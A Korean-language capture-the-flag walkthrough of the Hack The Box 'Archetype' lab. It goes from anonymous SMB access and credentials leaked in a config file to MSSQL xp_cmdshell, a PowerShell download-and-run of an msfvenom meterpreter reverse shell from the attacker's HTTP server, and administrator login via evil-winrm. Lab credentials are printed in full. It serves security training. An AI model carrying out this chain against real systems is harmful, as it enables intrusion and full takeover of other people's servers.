machine을 nmap으로 스캔하여 445포트의 smb사용을 확인
smbclient -L <ip>로 client의 공유폴더 리스트를 확인한다.

공유 폴더는 ADMIN$, backups, C$, IPC$ 총 4개이며 $사인이 없는 backups만 id와 pw없이 접근이 가능하다.
smbclient //<ip>/backups로 연결

prod.dtsConfig 파일을 get <file name>으로 다운로드하여 파일에서 id와 password를 발견할 수 있다.
포트 스캔때 mssql 서버가 열려있는 것을 이용하여 mssqlclient.py로 mssql server에 연결을 시도 할 수 있다.
locate mssqlclient.py로 파일을 확인하여 실행
실행 시 id와 password를 config파일에서 찾은 것을 대입해본다.

./mssqlclient.py <id>:<pw>@<ip> -windows-auth
실제 실행 예시: ./mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.x.x -windows-auth

접속하여 cmdshell을 enable_xp_cmdshell로 cmdshell 사용을 가능하게 설정한다.
이후 xp_cmdshell <명령>으로 동작 수행
사용방법:xp_cmdshell "powershell -c <명령>"

meterpreter를 얻기 위해 reverse shell을 수행한다.

msfvenom으로 payload.exe생성
msfconsole사용
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp 이후 옵션을 적절히 설정

reverse shell을위해 run하여 listening

python -m http.server 80으로 서버 open(python3 전용 명령어)
xp_cmdshell "powershell -c cd C:/Users/Public; wget http:<자신의 ip>/payload.exe -o payload.exe"를 실행
->파이썬으로 열었던 서버에서 payload.exe를 machine에 전달
주의사항:mssql server이므로 경로를 지정하지 않을 경우 기본 홈 디렉터리로 인식하기 때문에 C:/Users로 지정해야 함

xp_cmdshell "powershell -c cd C:/Users/Public; ./payload.exe"로 악성코드 실행

meterpreter를 얻은 후 winPEAS로 권한 상승을 시도
(winPEAS:자동화된 스크립트로 권한 상승을 할 수 있는지 여부를 확인한다.)
winPEAS 출력결과 중 빨간색 글씨는 쉽게 exploit될 수 있는 취약점
ConsoleHost_history.txt가 빨간색 글씨로 표시되어 있으며 admin정보가 안에서 발견되었다.

htb 문제 중 user의 flag값은 meterpreter에서 C:\Users\sqlsvc\Desktop 에 있는 users.txt에 있다.

root flag값은 winpeas실행으로 얻은 정보로 evil-winrm실행(5985포트가 열려있어고 winrm을 사용 중이어야 가능)
evil-winrm -u <admin ip> -p '<pw>' -i <ip>
공격예시: evil-winrm -u administrator -p 'MEGACORP_4dm1n!!' -i 10.129.x.x
연결하여 flag탐색
